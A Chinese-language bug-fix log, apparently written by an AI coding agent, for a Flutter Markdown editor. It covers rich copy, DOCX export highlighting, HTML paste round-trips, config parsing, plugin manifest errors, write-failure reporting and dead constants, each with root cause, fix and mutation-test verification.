在预览里选中一段含行内公式（或图片、上下标、脚注引用、注音）的文字，复制，粘到 Word——**标题、粗体、链接全没了**，只有纯文字。同一段去掉公式再复制，一切正常。

### 根因分析

富文本复制的做法是：把选中的文字在「文档渲染后的文字」里定位，找到它覆盖了哪些块，再把那些块转成 HTML。

定位靠 `rendered.indexOf(selection)`。而 `plainTextOf` 构造的「渲染后的文字」和屏幕上真正的文字**不是同一串**：

预览把六种内联画成 widget——`mathInline`、`image`、`superscript`、`subscript`、`footnoteRef`、`ruby`。每个 widget 在文本里占**一个**位置，就是 U+FFFC（object replacement character），而喂给它的那些字母（LaTeX、alt 文字、指数的数字）**根本不在屏幕上，选不中**。

`plainTextOf` 返回的是那些字母。于是：

| | `Energy is $E = mc^2$ here.` |
|---|---|
| 屏幕上 / 选区里 | `Energy is ￼ here.` |
| `plainTextOf` | `Energy is E = mc^2 here.` |

`indexOf` 找不到，返回 null，复制静默退回纯文本。

showcase.md 第 21 行就有一个行内公式。

### 修复方案

`plainTextOf` 对这六种放一个 U+FFFC。图片有例外：没有 href 的图片画成 `[alt]`，是字母不是 widget，所以按 href 分支。

这份清单放在 rich copy 这边而不是解析器里——解析器不该知道任何东西是怎么画的。

### 关键：清单必须被钉住

「哪些内联是 widget」现在写在两个地方：渲染器自己的 switch，和这份清单。**又一份抄写。**

新增 `preview_placeholder_test`：真的渲染一遍，取 `RichText` 的 `toPlainText()`，和 `plainTextOf` **逐字符**比较。渲染器改了画法而清单没跟上，它立刻红。

### 验证

四次变异：`_isWidget` 恒 false 杀 7 条；清单里去掉 `mathInline` 杀 3；去掉 `image` 杀 1；去掉 `superscript` 杀 2。

### 涉及文件

`lib/services/rich_copy_service.dart`；`test/services/rich_copy_test.dart`、`test/ui/editor/preview_placeholder_test.dart`（新增）

---

## BUG-273：行内代码的两个空格是内容，不是样式

### 现象

绑定测试（BUG-272）写完当场抓到的第二条，而且比公式常见得多。

`Call \`doThing()\` when ready` 在屏幕上是 `Call  doThing()  when ready`——**代码前后各多一个空格**。

### 根因分析

```dart
children.add(TextSpan(text: ' ${span.text} ', style: s));
```

加空格是为了让背景色不紧贴字母。但**空格是内容**：它跟着被选中、被复制、被算进每一个偏移。

三个后果：

1. 富文本复制对**含行内代码的段落**同样失败——和 BUG-272 一样的原因，而行内代码到处都是
2. 复制出去多两个空格
3. **紧挨着的搜索分支从来不加空格**——所以打开查找框，同一段文字的长度就变了，行内代码的留白当场消失

### 修复方案

不加。

不是在 `plainTextOf` 里把这两个空格补上——那只修了三条里的一条，而且等于承认「文字里有一段只为了好看而存在的内容」。

**搜索打开时本来就是紧贴的**，所以「紧贴」不是新样子，只是让它一直如此。Flutter 的 `TextSpan` 给不了不引入内容的内边距；能给的只有 `WidgetSpan`，而那会让代码变得选不中、搜不到，比留白重要得多。

**如果你觉得紧贴太挤**，这条可以回退，但那要连带接受上面三个后果——或者改成 `WidgetSpan` 并放弃代码文字的可选中性。留给你定。

### 验证

恢复那两个空格 → 杀 1 条。整个测试套件里没有任何一条依赖它们。

### 涉及文件

`lib/ui/editor/markdown_renderer.dart`

---

## BUG-274：从哪个窗格复制，决定了标签是不是格式

### 现象

设置里的「行内 HTML」是关着的（默认）。源码里写 `a <b>tagged</b> word`：

- 预览里：`<b>` 是**字面文字**
- 从预览选中复制到 Word：字面文字 ✓
- **从源码窗格选中复制到 Word：变成了粗体** ✗

同一段源码，读者在哪个窗格里选的，决定了它是文字还是格式。而两个答案里没有一个是读者要的——他们关掉了那个开关。

### 根因分析

两条复制路径：

| 路径 | 节点从哪来 |
|------|-----------|
| 预览 | 渲染器的 `_cachedNodes`——跟着 `config.enableHtml` ✓ |
| 源码窗格 | `MarkdownParser(enableHtml: true)`——**写死** |

写死那处没有注释说明理由，从提交历史看也不像是刻意的。

### 修复方案

`htmlForMarkdownSelection` 把 `enableHtml` 收为**必填**参数，三个调用点（编辑菜单的复制、剪切，源码窗格的 Ctrl-C）传读者的设置。必填而不是给默认值：默认值和忘记传参在代码里长得一样。

### 顺带修好一条测试

`menu_copy_rich_guard_test` 用**精确字符串**匹配 `RichCopyService.htmlForMarkdownSelection(selected)`。参数列表一换行它就红——而换行说明不了复制有没有坏。

改成用正则取出「调用连同它的参数」，然后断言：两处都在；每一处都带 `enableHtml:`；**并且不是字面量**。

最后那条是加上去的：第一版只断言「含 `enableHtml:`」，而 `enableHtml: true` 正是要防的那个 bug，它也含这个词——变异（把一处写死回 true）没被杀掉。

### 一次自己造成的返工

改三个调用点时对 `app_menu_bar.dart` 和 `source_editor.dart` 跑了 `dart format`，重排 700 多行、真实改动只有 3 处，还踩出一条既有的 lint 错误。这正是「只对新建文件跑 dart format」这条规矩要防的事。`git checkout` 撤回后重做。

### 验证

- 忽略设置恒为 true / 恒为 false → 各杀 1 条
- 一处写死 true → 杀守卫 1 条
- 删掉一处调用 → 杀守卫 1 条

### 涉及文件

`lib/services/rich_copy_service.dart`、`lib/ui/widgets/app_menu_bar.dart`、`lib/ui/editor/source_editor.dart`；`test/services/rich_copy_test.dart`、`test/ui/widgets/menu_copy_rich_guard_test.dart`、`test/ui/editor/preview_placeholder_test.dart`

---

## BUG-275：`==高亮==` 到了 Word 就是普通文字

### 现象

`==标出来==` 导出 Word，底色完全没有。上标、下标、下划线、删除线、行内代码都正常，只有它。

### 根因分析

**上游 `docx_creator` 的判断漏了一项。** 一个 run 要不要写 `<w:rPr>`（属性块），由 `_hasFormatting` 决定：

```dart
bool get _hasFormatting =>
    isBold || isItalic || decorations.isNotEmpty || ...
    themeFill != null ||
    themeFillTint != null ||
    themeFillShade != null;      // ← 三个 themeFill 都在
                                 // ← shadingFill 不在
```

于是**只设了 `shadingFill` 的 run，整个属性块都不写**，底色随之消失。写出逻辑本身是对的（`writeShading` 检查 fill 非空就写 `w:shd`），错的是它压根没被调用。

这解释了为什么嵌套的情况反而正常：`==标出来的 **重点** 在此==` 里的「重点」还带着 bold，`_hasFormatting` 因为 bold 为真，属性块写了出来，底色跟着一起写了。**格式越多越正常，孤零零的高亮反而丢**。

### 为什么一直没被发现

Word 导出的测试只断言了两件事：文件以 `PK` 开头、字节数大于 2000。

`export_survives_new_constructs_test` 的开头注释早就点破过这件事——「现有的导出测试断言文件开头的魔数，而一个没有任何有用内容的文件也能通过」——那句话是写给旧测试的，而这个文件自己的 Word 测试仍然只做了这两件事。

变异验证时抓到的：把 Word 的上标属性去掉，全部测试照过。

### 修复方案

改用 **Word 自己的荧光笔**（`<w:highlight w:val="yellow"/>`）而不是背景填充。两个理由：

1. 那才是 `==marked==` 的意思——Word 用户认得那支笔
2. 它在 `_hasFormatting` 的列表里，能被写出来

两处都改：`_docxTextFor`（独立的高亮）与 `_withEmphasis`（折进内层 run 的高亮）。

**没有改上游。** 值得给 `docx_creator` 报一个 issue（`_hasFormatting` 漏了 `shadingFill`），但那是往别人仓库里提东西，等你点头。

### 顺带补上的覆盖

- **导出 fixture** 加进 `==高亮==`、`^上标^`、`~下标~`、`++下划线++`、`~~删除线~~`、行内公式、脚注，以及两种嵌套。HTML 侧逐个断言 `<mark>` `<sup>` `<sub>` `<u>` `<del>`。这个 fixture 的注释写着「grown rather than replaced」，而 v1.6.2 新认的那几种从没进来过
- **Word 侧第一次有了内容断言**：六种内联各自的 XML 属性

### 一条基于错误假设的测试，写完就删了

原本还写了「上标里的加粗要同时保留两者」。探针一看：`^**2**^` 的内容**根本不再解析内联**，`**` 原样留在文字里——预览也是这样。所以 `_withEmphasis` 的 `_ => run` 对上下标不是缺口，它们永远不带 children。

那条删掉了，理由写进注释：省得下次有人（包括我）又去修一个不存在的洞。

### 验证

Word 侧逐个变异，各杀 1–2 条：去掉 superscript / subscript / underline / strikethrough / highlight 的属性；`_withEmphasis` 退回 `shadingFill`。

### 涉及文件

`lib/services/export_service.dart`；`test/services/docx_nesting_test.dart`、`test/services/export_survives_new_constructs_test.dart`

---

## BUG-276：粘进来的标记，粘完就没了

### 现象

从网页复制一段带 `<mark>`、`<u>`、`<sup>`、`<sub>` 的文字粘进编辑器，格式全没，只剩words。维基百科的脚注引用（`<sup>`）、任何页面的荧光标记，都是如此。

**编辑器自己导出的 HTML 也读不回来**——它写 `<mark>`，然后不认识 `<mark>`。

### 根因分析

又是一条规则两份表，而且这两份是**互逆**的：

| | 导出写出去 | 粘贴读回来 |
|---|---|---|
| `<strong> <em> <del> <code> <a> <img> <br>` | ✓ | ✓ |
| **`<mark> <u> <sup> <sub>`** | ✓ | **✗** |

编辑器**四种全都有对应的 Markdown 语法**（`==x==`、`++x++`、`^x^`、`~x~`），只是粘贴那侧的 switch 没有这几个 case，落进 `default: index++`——标签跳过，文字留下。

**还有一层**：块级那层维护着另一份「哪些标签算内联」的清单，里面同样没有这四个，**连 `<code>` 都没有**。所以一个没有 `<p>` 包裹的片段——选中一个词复制，剪贴板里常常就是这样——顶层的 `<mark>词</mark>` 会被整个跳过。

### 修复方案

两处都补。四种转成各自的 Markdown 语法，块级清单加上这四个和 `code`。

**`^x^` 与 `~x~` 有个条件**：它们的语法定义就是「一段不含空白的文字」（解析器的 `[^\s^]+`）。把一个短语包进去，会产出一份**编辑器自己读回来是字面尖括号**的文档——那比留下纯文字更糟。所以含空白时不包。

（中文短语没有空白，照包不误，也读得回来。这一点我第一版测试搞错了：用「上面那条」断言它该保持纯文本，而那是一句关于错误对象的断言。）

### 关键：把两个方向绑在一起

新增 `html_round_trip_test`：一段 Markdown → `nodeToHtml` → `HtmlToMarkdown.convert` → **必须一字不差地回到原样**。10 种构造，从粗体到下标。

这是两张表之间第一次有东西连着。导出学会一个新标签而粘贴没跟上，它立刻红。

### 验证

- 逐个去掉 `mark` / `sup` / `sub` 的转换 → 各杀 2–3 条
- 空格检查失效 → 杀 1 条
- 块级清单退回原样 → 杀 1 条；只漏掉 `code` → 也杀 1 条

其中「块级清单」那次**第一遍没杀掉**：我的测试全用 `<p>` 包着，走的是内联路径，够不到块级那张表。补了一条顶层片段的测试才抓住。

### 顺带查过、没有做的：PDF 的内容断言

BUG-275 给 Word 补了内容断言之后，PDF 那侧同样只有 `%PDF-` 和「字节数大于 2000」。

试过了：`pdf` 包的输出用 FlateDecode 压缩，解压之后文字是**嵌入字体子集的 glyph 索引**（`[<0001>]TJ`），不是明文。要读回文字得解析字体的 cmap 反查——代价远超收益。

能确定的是每个 `InlineType` 分支都被 fixture 走到过（BUG-275 补的），所以「新类型让 PDF 导出抛异常」这一类还是抓得住的；抓不住的是静默画错。记在这里，省得下次再试一遍。

### 涉及文件

`lib/services/html_to_markdown.dart`；`test/services/html_to_markdown_test.dart`、`test/services/html_round_trip_test.dart`（新增）

---

## BUG-277：配置里错一个字段，全部设置一起没

### 现象

配置文件是 JSON，存在系统应用目录里，读者打得开也改得动。里面**任何一个** bool / 整数 / 字符串字段类型写错——比如把 `"sideBarVisible": true` 手抖写成 `"yes"`——**主题、字体、快捷键、最近文件、会话标签页全部回到默认值**，而且一声不吭。

### 根因分析

`AppConfig.fromJson` 读每个字段用的是 `json['x'] as bool? ?? 默认值`。

Dart 的 `as bool?` 对**错误类型**是抛 `TypeError`，不是返回 null——`?? 默认值` 根本轮不到。一个字段抛，整个 `fromJson` 抛；`ConfigService` 用 try/catch 兜住，回退到一份全新的默认配置。

作者**已经知道**要宽容：`fontSize`、`splitRatio` 走 `_parseDouble`，`editMode`、`aiProvider` 走各自的解析函数，坏值各自回默认。只是 37 个 bool / int / String 字段没做。

**列表更隐蔽。** `(json['sessionTabs'] as List?)?.cast<String>()`——`cast` 是**惰性**的，一个混进数字的列表在 `fromJson` 这里顺利通过，等到某处遍历它时才抛，而那时已经和配置文件没有任何看得出的联系。

### 修复方案

补上 `_parseBool` / `_parseInt` / `_parseString` / `_parseStringList`，和已有的 `_parseDouble` 一个风格。语义与原来完全一致，只是**不再抛**：错的那个字段回到自己的默认值，别的字段留下。

`_parseInt` 多接受一种：JSON 只有一个数字类型，`8000` 存下来可能读回 `8000.0`，而 `as int?` 对它同样抛。

`_parseStringList` 跳过列表里不是字符串的项，而不是让它潜伏到以后。

### 验证：一次不能区分假设的断言

四次变异，三次立刻被杀。**「int 不再接受小数」那次没有**——我的测试用的是 `{'autoSaveDelay': 5000.0}`，而 5000 **正好是这个字段的默认值**：读对了是 5000，读错了回退也是 5000，断言两种情况都满足。

换成 8000.0 才真正区分开。

### 涉及文件

`lib/core/config/app_config.dart`；`test/core/config/app_config_test.dart`

---

## BUG-278：装上了却不在列表里，没人说为什么

### 现象

装一个 manifest 有问题的插件——键写错、runtime 拼错、`entrypoints` 里把 `windows` 打成 `windwos`——它**根本不出现在插件列表里**。没有错误，没有提示。

对读者来说，「装了但看不到」和「根本没装上」长得一模一样。于是重装一遍，还是没有。

### 根因分析

```dart
} catch (_) {
  // A broken plugin is ignored and cannot stop the editor from starting.
}
```

**忽略是对的**——一个坏插件不该让编辑器起不来，它也确实没有。**默默忽略不对**。

而且原因**早就写好了**。`PluginManifest.fromJson` 拒绝一个 manifest 时给的是一句能照着改的话：

> `unknown operating system in "entrypoints": windwos. Expected one of windows, macos, linux`

写这句话的人显然设想过它会被谁读到。它进了 `catch (_)`，**一次也没有送达过任何人**。

这和 BUG-265 是同一个形状：编辑器替读者做了判断，判断的依据读者看不到。

### 修复方案

`loadInstalled` 和新的 `problems()` 共用一次目录遍历（`_scan()`），各取一半——没有重复扫描的代码，也没有两份规则。

插件设置页在已安装列表下方多一段「Installed but unreadable」，一行一个：目录名 + 那句本来就写好的话。

两个判断值得说明：

- **没有 `manifest.json` 的目录不算坏插件。** 插件的工作文件就放在它们旁边，把那些叫做「坏插件」是一句关于无事的警告
- **`FormatException` 只取 message。** 它默认打印成 `FormatException: ...`，而类名对一个正在看「插件为什么没出现」的人是噪音

### 验证

三次变异，各杀 1–2 条：不再收集问题；把没有 manifest 的普通目录也算成坏插件；把具体原因换成一句「broken」。

### 发布之后要做的一件事

**SDK 文档要补一节「装上了却不出现怎么办」。** 它的「Trying a plugin before you ship it」讲了发布前怎么试，没讲装上之后读不进来去哪看原因——而那正是这条修复给出的答案，也正是插件作者最需要知道的。

**现在不加**，因为这个能力还在 dev 上等人工测试。在它发布之前往 SDK 文档里写「去插件页看错误」，就是 BUG-266 那个毛病的翻版：文档承诺一件还没兑现的事。

`marktext-plus-plugin-sdk` 的 README 和 11 份翻译，等 v1.6.2 出去之后。

### 涉及文件

`lib/services/plugin_manager.dart`、`lib/providers/plugin_provider.dart`、`lib/ui/widgets/plugin_panel.dart`、`lib/ui/screens/plugin_detail_view.dart`；`test/services/plugin_problems_test.dart`（新增）

---

## BUG-279：选了「用我的覆盖」，写失败，横幅消失

### 现象

文档和磁盘上的版本分叉了，编辑器给出三个选择。读者选「用我的覆盖」——**如果这次写失败**（权限、磁盘满、路径变成了目录）：

- 没有任何提示
- **冲突横幅消失了**
- 磁盘上还是对方的版本

读者得到的信号是「解决了」。这是丢工作的形状。

### 根因分析

```dart
case 'overwrite':
  await notifier.overwriteOnDisk(tab.id);   // 返回值丢掉
```

而 `overwriteOnDisk` 的 `false` **有两种含义**：

| false | 含义 |
|---|---|
| `tab?.filePath == null` | 没有文件可写——不是失败 |
| `catch (_) { return false; }` | 写失败了 |

调用方分不开，于是两个都没看。这是记忆里那条「一个 null 两种含义」的同一个形状。

**同一个应用里已经有做对的地方**：`EditorTabBar.saveTab` 用 `reportSaveFailure(e)` 说出原因，注释写着「Closing on a failed write would lose the content the save was meant to protect」。机制齐全，这两处没接上。

`rereadAs`（状态栏点编码、选一个重读）同样：读失败返回 false，调用方 `await ... ;` 连返回值都不看——读者选了 GBK，标签没变，没有任何解释。

### 修复方案

把两种 false 拆开：**前置条件不满足仍返回 false，操作失败往外抛**，和 `saveTab` 的做法一致。

调用方接住：

- 覆盖失败 → `reportSaveFailure(error)` **并且 `markDiskConflict`**——横幅必须留着，它消失就等于说覆盖成功了
- 重读失败 → `reportOpenFailure(error)`

### 验证：一个 fixture 选错了

第一版用 `${root.path}/nowhere/note.md` 当「写不进去的路径」，断言它抛——**它没抛，写成功了**：`saveDocument` 会自己建目录。换成一个已存在的**目录**路径才真正写不进去。

两处 UI 调用藏在菜单对话框和状态栏弹窗后面，widget test 够不到，用源码守卫钉住：那个调用在 try 里、catch 里有报告、覆盖那条的 catch 里还要有 `markDiskConflict`。三次变异各杀 1 条。

守卫的第一版按「两个地标之间」取区间，而 catch 在地标之后——取到的段里根本没有 catch。改成直接匹配「这个调用位于 try 内，及其后的 catch 体」。

### 涉及文件

`lib/providers/tab_provider.dart`、`lib/ui/widgets/app_menu_bar.dart`、`lib/ui/widgets/status_bar.dart`；`test/providers/write_failure_reaches_the_reader_test.dart`、`test/ui/widgets/failure_reaches_the_reader_guard_test.dart`（均新增）

---

## BUG-280：同一个 switch 里的兄弟分支，上一条只修了一半

### 现象

磁盘冲突对话框给三个选择。BUG-279 修了「用我的覆盖」，**「用磁盘上的」原封不动**：

```dart
case 'overwrite':
  try { ... } catch (error) { reportSaveFailure(error); ... }   // 上一条修的
case 'reload':
  await notifier.reloadFromDisk(tab.id);                        // 没动
```

两个 case 在屏幕上挨着，我上一轮看着它们改了前一个。

### 根因分析

`reloadFromDisk` 和 `overwriteOnDisk` 是同一个形状：`false` 既是「没有文件可读」也是「读失败了」，调用方两个都不看。

**后果比 BUG-279 轻**：读失败时状态更新在 try 块里不执行，所以冲突横幅**自己留着**——读者能看出没成功。但横幅留着只说明「冲突还在」，不说明**为什么读不了**。读者点了「用磁盘上的」，什么都没发生，横幅还在。

### 修复方案

和另外两个一致：前置条件仍返回 false，读失败往外抛，调用方 `reportOpenFailure(error)`。

三个出口（覆盖、重新加载、换编码重读）现在是同一套规矩。

### 顺带查过、没有问题的

同一个视角扫了剩下返回 `Future<bool>` 的方法：

- `moveToTrash` —— 调用方**检查了**返回值，trash 不可用时退回直接删除，而确认对话框已经说明过这一点 ✓
- `_runFileOp`（侧边栏所有文件操作的统一包装）—— `PathExistsException` 有专门的、读者能照做的消息，其余带原因显示 ✓
- `hasChangedSince` / `isEnabled` —— 查询，不是操作

### 验证

两次变异各杀 1 条：`reloadFromDisk` 退回静默 false；调用方不再接住。守卫测试也补了这一半。

### 涉及文件

`lib/providers/tab_provider.dart`、`lib/ui/widgets/app_menu_bar.dart`；`test/providers/write_failure_reaches_the_reader_test.dart`、`test/ui/widgets/failure_reaches_the_reader_guard_test.dart`

---

## BUG-281：BUG-271 漏掉的两个内联类型

### 现象

把「改一个分支就读完它的兄弟」这条用在自己当天的改动上，逐条对了一遍解析器产出的 13 种内联类型和高亮器认识的 8 种：

| 解析器 | 源码窗格 |
|---|---|
| bold / italic / code / link / image / strikethrough / highlight / underline | ✓ |
| **mathInline** | **无** |
| **footnoteRef** | **无** |
| superscript / subscript | 无——**有意**（BUG-273 的注释写了理由） |

`$E = mc^2$` 预览画成公式，源码窗格一片灰。`[^1]` 预览画成主色的上标 `[1]`，源码窗格也是灰的。

BUG-271 那轮我只补了 `==` 和 `++`。

### 修复方案

- **公式**染成 code 色。不是审美创造，是归类：在一个显示 markdown 的窗格里，公式和代码是同一类东西——一段不按普通文字读的源码。正则照抄解析器的，包括那两个前后瞻：`$` 后跟空白不开始，`$` 前是空白不结束，所以 `it cost $5 and $10` 仍然是一句关于钱的话
- **脚注引用**染成 link 色，因为预览就是用主色画它的，而主色正是链接的颜色。它不会和链接规则打架：那条要求方括号后面跟一对圆括号

### 性能：两种测量，结论相反

| fixture | 旧 | 新 |
|---|---|---|
| 刻意构造的 `$` 密集文本（每三行两个） | 335 ms | **366 ms（+9%）** |
| 真实 markdown（showcase.md ×400，0.7% 的行含 `$`） | 180 ms | **173 ms（噪声内）** |

第一个数字看着吓人，但它描述的是一份不存在的文档。真实 markdown 里含 `$` 的行不到 1%，预扫（BUG-270）让其余的行一次都不跑那条正则。

**两个都记下来**，因为只记第一个会让人以为不该加，只记第二个会让人以为没有代价。

### 验证

四次变异各杀 1 条：去掉公式规则；去掉脚注规则；公式不再要求无空白边界（`$5 and $10` 会被吃成公式）；预扫漏掉 `$`。

### 涉及文件

`lib/ui/editor/syntax_highlighter.dart`；`test/ui/editor/highlight_agrees_with_parser_test.dart`

---

## 一次开到一半掉头的改动：`show` / `ask` / `diff` 要不要权限

**不是 bug 记录，是一次判断的记录。**

上一轮我留了个问题给用户：插件动作有 8 种，权限守卫只查 4 种，`show`（悬浮卡片）、`ask`（问读者）、`diff`（展示改动）没查。留着的理由是「收紧会影响已发布的第三方插件」。

这一轮先去查影响面——GitHub topic `marktext-plus-plugin` 下**只有两个仓库，都是官方的**。第三方生态是空的，收紧的实际代价为零。于是动手了：写测试、改守卫、修被正确破坏的几个测试插件。

**然后撞上这个：**

```dart
test('showing a result needs no permission at all', () {
```

测试的**名字**就是一条明确的主张。有人特意写下过这个决定，而我推翻它的理由只是「一致性」。

### 掉头的理由

查明影响面为零，只回答了「能不能」，没回答「该不该」。而后者本来就是我留给用户的那一半。

想清楚之后，当初那个决定站得住：

**`show` 是命令回答提出命令的人。** 一个不能回答的插件什么也做不了，所以要求这个权限等于要求**每个插件**都声明它——而一个人人都持有的权限，对读者不传递任何信息。`notify` 不同：它是不必被问就能说话的那一个。

反方也是真的：卡片盖在文档上、不关不走，比一条通知占更多屏幕。

### 做了什么

撤销全部改动，把这段推理写进 `_guard`（它**看起来**就像个遗漏，所以注释首先说明「这是有意的」）和那条测试的文档注释里。正反两方都写，因为将来定这件事的人需要两边。

净改动：21 行注释，0 行行为。

### 为什么记下来

这个缺口会再被发现一次——它形状太像 bug 了。下一个人应该看到它被想过，以及想到了哪里。

---

## BUG-282：一个从来没人读过的常量

### 现象

```dart
static const int maxRecentFiles = 20;
```

`grep` 整个代码库，这个常量出现**一次**——就是它自己这行定义。真正的裁剪在另一个文件里：

```dart
if (files.length > 10) {
  files.removeRange(10, files.length);
}
```

**常量说 20，实际是 10。** 而写着"这是规则"的那一份，是死的。

### 根因分析

「一条规则抄了两份，其中一份没跟上」的极端形态：其中一份**从未生效过**。

功能上没有问题——10 的上限确实在起作用。坏的是别的：

- 任何读 `constants.dart` 的人会以为上限是 20
- 想改上限的人多半会去改常量，然后**什么也不会发生**

### 修复方案

常量改成 **10**，`addRecentFile` 引用它。

为什么是 10 不是 20：**10 是一直以来的实际行为**，是使用者见过的唯一一个数。20 从未生效过，改成它就是行为改变，而没有任何依据说 20 是当初想要的——只知道有人写下过它。不确定时不动既有行为。

上限存在的理由也写进注释了：这个列表进配置文件，而配置文件每次启动都要读。

### 验证

测试**通过常量断言**，不是写死数字——这才让常量成为规则，而不是关于规则的一句描述。

两次变异各杀 1 条：让常量和实现重新分家（常量 20、实现 10）；完全去掉上限。

### 顺带查过、没有问题的

同一个视角扫了别的阈值：`maxHighlightedLength`（128 KB）的测试用常量构造 fixture、真的跨过了阈值，还断言「不上色也要一个字都不少」；`_maxHistory` 是私有常量、两处引用一致。

### 涉及文件

`lib/core/constants.dart`、`lib/providers/settings_provider.dart`；`test/providers/recent_files_limit_test.dart`（新增）

---

## BUG-283：一个事实上已经废弃的常量文件

### 现象

BUG-282 修完一个死常量之后，把整个 `AppConstants` 数了一遍：**18 个里 14 个从来没人读**。

清点结果分三类：

| 类别 | 数量 | 例子 |
|---|---|---|
| **说了假话** | 1 | `minWindowWidth = 800`，而窗口实际最小 480（`WindowPlacement.minimumSize`） |
| **过时的遗留** | 1 | `configDirName = 'marktext-plus'`——V1.1.3 配置目录就从 `~/.marktext-plus/` 迁到系统应用目录了 |
| **和别处重复** | 12 | `defaultFontSize = 16.0` 对 `AppConfig` 的默认参数；`minFontSize/maxFontSize` 对 `app_menu_bar` 里两处 `clamp(12.0, 32.0)` |

**一个没人读的值，是一个没有任何东西负责让它保持为真的值。** 这就是它为什么会变成假话——`minWindowWidth` 和 `maxRecentFiles` 都不是一开始就错的。

### 修复方案

按「权威在哪」分开处理：

- **权威在别处的，删掉**（10 个）。`AppConfig` 的默认参数就是默认值的定义，`WindowPlacement.minimumSize` 就是最小尺寸的定义，配置路径来自 `getApplicationSupportDirectory()`。在这里再抄一份，只是多一个可以改的地方，和一个不必被改的地方
- **确实有多处读同一个值的，让它们真的去读**（8 个使用点）：应用名 2 处、字号上下限 2 处、分屏比例 2 处、防抖 300ms 4 处

剩 8 个常量，每一个都至少被两处读。

### 关键：把规矩变成能失败的东西

文件顶部本来就该有一条规矩——「**一个值放在这里，前提是至少两处从这里读它**」。写成注释，它就只是一句描述。

`constants_are_read_test` 让它成为规则：读 `constants.dart` 提取每个常量名，扫 `lib/` 下所有 `.dart`，任何一个没有 `AppConstants.<名字>` 就红，并且直接告诉你是哪几个、两条出路是什么。

### 验证

两次变异各杀 1 条：加一个没人读的常量；把某个使用点退回硬编码。

**还有一次自己造成的：** 变异 `split_editor.dart` 之后我用 `git checkout` 还原——它把这一轮**尚未提交**的改动一起抹掉了，「还原后」当场变红。和昨天 BUG-275 那次一模一样（记忆里那条「变异测试的备份取在修复之后」说的正是这个）。重新应用了。

### 涉及文件

`lib/core/constants.dart`、`lib/main.dart`、`lib/app.dart`、`lib/ui/widgets/app_menu_bar.dart`、`lib/ui/editor/split_editor.dart`、`lib/ui/editor/source_editor.dart`、`lib/ui/screens/settings_screen.dart`、`lib/services/open_document_watcher.dart`；`test/core/constants_are_read_test.dart`（新增）

---

## BUG-284：一个装上了就没人撤的看门狗

### 现象

关窗口时，`onWindowClose` 会先装一个看门狗再调用 `destroy()`：

```dart
StartupTrace.armShutdownWatchdog();   // 每 100ms 记一条，600ms 后 exit(0)
await windowManager.destroy();
StartupTrace.mark('window destroyed');
StartupTrace.flush();
```

装它的理由写在注释里，是对的：「Armed before `destroy()` rather than after, so that a `destroy()` which never returns is covered too」——关闭卡死时不能让人干等。

**问题是它再也没被撤下。** `destroy()` 返回之后（下一行 `mark('window destroyed')` 就说明它可能返回），看门狗还在跑：

- 每 100 毫秒往 trace 里写一条 `still running Nms after close began`
- 600 毫秒时 **`exit(0)`，抢在已经在进行的正常退出前面**

### 根因分析

`StartupTrace.shutdownFinished()` 就是为这件事写的——注释写着「Called when shutdown completed on its own; stops the watchdog」——而**它没有任何调用者**。

和 `PluginPermission.describe`（BUG-265）、`maxRecentFiles`（BUG-282）、整个常量文件（BUG-283）是同一个模式的第四例：**写好了、有明确用途、没接上**。

这次是接线，不是逻辑：函数本身完全正常，单元测试一写就过。

**两条关闭路径都是这样**——有未保存文件和没有的两个分支，同样的四行代码，同样都没撤。昨天记下的「改一个分支就读完它的兄弟」在这里直接派上用场，两处一起改。

### 验证

`shutdownFinished` 的行为好测（装上、等一会、撤下、确认不再有新行）；缺的是**接线**，而关闭路径藏在窗口事件后面，widget test 够不到，所以用源码守卫：每一处 `windowManager.destroy()` 之后的代码行里必须有 `shutdownFinished`。

三次变异各杀 1 条：两条路径分别去掉；把 `shutdownFinished` 变成空壳。

**守卫的第一版被自己的注释绊倒**：它取 `destroy()` 之后 300 个字符，而我给修复写的解释性注释把那行调用推到了窗口外面。改成「跳过注释行、取之后 4 行代码」——**一个源码守卫不该由注释的长度决定成败**。

### 涉及文件

`lib/ui/screens/home_screen.dart`；`test/core/diagnostics/shutdown_watchdog_test.dart`（新增）

---

## 收尾：上一轮那次扫描的剩余两项

BUG-284 是扫描「没人调用的公开静态方法」时找到的。当时列出三个真死的，修了最要紧的那个（看门狗），这里了结另外两个——**分量很小，记下来是为了那次扫描有个交代**。

- **`FileUtils.getFileName`** 是 `p.basename` 的一行转发，零调用者，而项目里到处直接用 `p.basename`。删掉：留着一个没人用的别名，只会让下一个人犹豫该用哪个
- **`CodeHighlighting.clearCache`** 不是死的——高亮缓存测试的 `setUp` 用它做测试隔离（缓存是静态的，一个测试的条目会留给下一个）。标上 `@visibleForTesting`，让「只给测试用」显式，而不是看起来像一个没有入口的功能

`getExtension` 一度也进了嫌疑名单，实际有内部调用者（`isMarkdownFile` 用它）——**扫描时同类内的调用不带 `.` 前缀**，这是第二次被它绊到。

### 顺带查过、干净的

`pubspec.yaml` 的 **27 个 dependencies，每一个在 `lib/` 里都至少被 import 一次**。没有白白打进包里的东西。

### 涉及文件

`lib/utils/file_utils.dart`、`lib/ui/editor/code_highlighting.dart`

---

## BUG-285：教人写 manifest 的文件自己漏了一个

### 现象

SDK 的两个脚本示例（Lua / JS）用行尾注释教权限：

```lua
return sdk.notify(sdk.t("error.empty"))            -- needs ui.notifications
default = sdk.storage.get("language") or "English", -- needs storage.local
    and ctx.document                                -- needs document.read
)                                                   -- needs ai.chat
```

**五个需要权限的调用，标了四个。** `sdk.panel(...)` 需要 `ui.sidebar`，什么也没说。

### 根因分析

而 `ui.sidebar` **正是 BUG-263 里三个示例 manifest 漏声明的那一个**。当时修好了 manifest——**没修教人写 manifest 的那个文件**。

修一处症状而不修产生它的地方，下一个照着抄的人会犯同样的错。

两个示例都漏（它们是同一个插件的两种写法），这次一起改——BUG-280 的教训。

### 顺带写下的一件事

示例里现在也说明了 **`show` 和 `ask` 为什么没有 `needs` 注释**：它们不需要权限，因为回答刚运行了命令的读者是插件的本分，而一个人人都要声明的权限对读者不传递任何信息。

这是昨晚那次「开到一半掉头」想清楚的结论（记在 `_guard` 和那条测试里）。放到示例里，是因为插件作者会在那里遇到这个问题。

### 验证

`sdk_examples_test` 新增一条，规则从 manifest 读而不是写死清单：

- 两个示例的 `needs` 集合必须相同（抓「改一个没改另一个」）
- 必须含 `ui.sidebar`（钉住这次）
- **注释里提到的每个权限，manifest 都得声明**（抓「注释说了 manifest 没声明」）

三次变异各杀 1–3 条：Lua 漏掉、JS 漏掉、manifest 漏声明。

### 涉及文件

SDK 仓库 `packages/lua/plugin.lua`、`packages/js/plugin.js`；`test/services/sdk_examples_test.dart`

---

